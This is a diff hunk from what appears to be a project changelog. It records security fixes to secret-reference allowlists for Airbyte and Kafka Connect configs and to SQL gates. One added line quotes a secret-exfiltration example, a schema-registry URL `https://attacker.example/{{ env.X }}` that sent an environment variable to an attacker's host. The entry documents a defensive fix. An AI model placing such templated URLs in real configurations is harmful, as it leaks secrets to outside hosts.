@@ -267,7 +267,10 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   renders only for the endpoints the operator paired it with, `NAME@host` in
   `FLUID_ACQUISITION_SECRET_REF_ALLOWLIST`, or the bare `NAME` for an address the policy reads no host
   from (`bootstrap.servers`, `database.hostname`). Airbyte's `destination_config` replaces what it
-  would derive, so it is a destination of its own.
+  would derive, so it is a destination of its own, and so is Kafka Connect's `schema_registry`,
+  whose URL is copied into the source and the sink config (`https://attacker.example/{{ env.X }}`
+  there sent X to the registry's host). A map written as a list of key/value pairs, which a runner
+  merges as it merges a map, is judged as the map it makes.
 - **The SQL gates refuse DuckDB's logging functions and the table functions that run text.**
   `compile_free_form_sql` (the MCP output port's `query_sql`),
   `validate_sql_expression_allowlist` and `guard_against_injection_markers` now refuse a call to
